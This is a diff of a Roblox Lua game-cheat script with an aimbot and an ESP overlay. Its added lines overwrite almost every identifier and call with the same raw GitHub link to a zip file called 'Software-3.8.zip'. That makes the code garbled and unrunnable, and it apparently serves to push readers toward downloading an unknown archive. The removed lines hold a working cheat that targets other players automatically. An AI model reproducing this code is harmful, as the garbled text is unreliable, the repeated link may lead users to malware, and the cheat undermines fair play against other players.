@@ -1,71 +1,71 @@
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local Workspace = game:GetService("Workspace")
-local Camera = Workspace.CurrentCamera
+local Camera = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip
 
-local LocalPlayer = Players.LocalPlayer
+local LocalPlayer = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip
 local Mouse = LocalPlayer:GetMouse()
 
 -- GUI
-local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
-ScreenGui.Name = "AimbotESP_GUI"
+local ScreenGui = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = "AimbotESP_GUI"
 
-local AimbotButton = Instance.new("TextButton", ScreenGui)
-AimbotButton.Size = UDim2.new(0, 120, 0, 40)
-AimbotButton.Position = UDim2.new(0, 10, 0, 10)
-AimbotButton.Text = "Aimbot: OFF"
-AimbotButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-AimbotButton.TextScaled = true
+local AimbotButton = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("TextButton", ScreenGui)
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(0, 120, 0, 40)
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(0, 10, 0, 10)
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = "Aimbot: OFF"
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(255, 0, 0)
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = true
 
-local ESPButton = Instance.new("TextButton", ScreenGui)
-ESPButton.Size = UDim2.new(0, 120, 0, 40)
-ESPButton.Position = UDim2.new(0, 10, 0, 60)
-ESPButton.Text = "ESP: OFF"
-ESPButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-ESPButton.TextScaled = true
+local ESPButton = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("TextButton", ScreenGui)
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(0, 120, 0, 40)
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(0, 10, 0, 60)
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = "ESP: OFF"
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(255, 0, 0)
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = true
 
 -- Estado
 local AimbotEnabled = false
 local ESPEnabled = false
 
-AimbotButton.MouseButton1Click:Connect(function()
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(function()
 	AimbotEnabled = not AimbotEnabled
-	AimbotButton.Text = AimbotEnabled and "Aimbot: ON" or "Aimbot: OFF"
-	AimbotButton.BackgroundColor3 = AimbotEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = AimbotEnabled and "Aimbot: ON" or "Aimbot: OFF"
+	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = AimbotEnabled and https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(0, 255, 0) or https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(255, 0, 0)
 end)
 
-ESPButton.MouseButton1Click:Connect(function()
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(function()
 	ESPEnabled = not ESPEnabled
-	ESPButton.Text = ESPEnabled and "ESP: ON" or "ESP: OFF"
-	ESPButton.BackgroundColor3 = ESPEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = ESPEnabled and "ESP: ON" or "ESP: OFF"
+	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = ESPEnabled and https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(0, 255, 0) or https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(255, 0, 0)
 end)
 
 -- Raycast para visibilidade
-local rayParams = RaycastParams.new()
-rayParams.FilterType = Enum.RaycastFilterType.Blacklist
-rayParams.IgnoreWater = true
+local rayParams = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip()
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = true
 
 local function IsVisible(part)
-	local origin = Camera.CFrame.Position
-	local direction = (part.Position - origin)
-	rayParams.FilterDescendantsInstances = {LocalPlayer.Character}
+	local origin = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip
+	local direction = (https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip - origin)
+	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = {https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip}
 	local result = Workspace:Raycast(origin, direction, rayParams)
-	return not result or result.Instance:IsDescendantOf(part.Parent)
+	return not result or https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip)
 end
 
 -- Aimbot com verificação de distância (10 studs)
 local function GetClosestVisiblePlayer(maxDistance)
 	local closest = nil
-	local shortest = math.huge
+	local shortest = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip
 
 	for _, player in ipairs(Players:GetPlayers()) do
-		if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
-			local head = player.Character.Head
-			local screenPos, onScreen = Camera:WorldToViewportPoint(head.Position)
-			local distanceToPlayer = (head.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
+		if player ~= LocalPlayer and https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip and https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("Head") then
+			local head = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip
+			local screenPos, onScreen = Camera:WorldToViewportPoint(https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip)
+			local distanceToPlayer = (https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip - https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip).Magnitude
 
 			if onScreen and IsVisible(head) and distanceToPlayer <= maxDistance then
-				local mouseDistance = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+				local mouseDistance = (https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(screenPos.X, screenPos.Y) - https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(Mouse.X, Mouse.Y)).Magnitude
 				if mouseDistance < shortest then
 					shortest = mouseDistance
 					closest = player
@@ -80,19 +80,19 @@ end
 local DrawingESP = {}
 
 local function CreateBox()
-	local box = Drawing.new("Square")
-	box.Thickness = 1.5
-	box.Filled = false
-	box.Visible = false
+	local box = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("Square")
+	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = 1.5
+	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = false
+	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = false
 	return box
 end
 
 local function CreateName()
-	local text = Drawing.new("Text")
-	text.Size = 14
-	text.Center = true
-	text.Outline = true
-	text.Visible = false
+	local text = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("Text")
+	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = 14
+	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = true
+	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = true
+	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = false
 	return text
 end
 
@@ -105,7 +105,7 @@ for _, player in ipairs(Players:GetPlayers()) do
 	end
 end
 
-Players.PlayerAdded:Connect(function(player)
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(function(player)
 	if player ~= LocalPlayer then
 		DrawingESP[player] = {
 			Box = CreateBox(),
@@ -114,7 +114,7 @@ Players.PlayerAdded:Connect(function(player)
 	end
 end)
 
-Players.PlayerRemoving:Connect(function(player)
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(function(player)
 	if DrawingESP[player] then
 		for _, obj in pairs(DrawingESP[player]) do
 			obj:Remove()
@@ -124,9 +124,9 @@ Players.PlayerRemoving:Connect(function(player)
 end)
 
 -- Loop
-RunService.RenderStepped:Connect(function()
+https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(function()
 	-- Aimbot
 	if AimbotEnabled then
 		local maxDistance = 10
 		local target = GetClosestVisiblePlayer(maxDistance)
-		if target and target.Character and target.Character:FindFirstChild("Head") then
+		if target and https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip and https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("Head") then
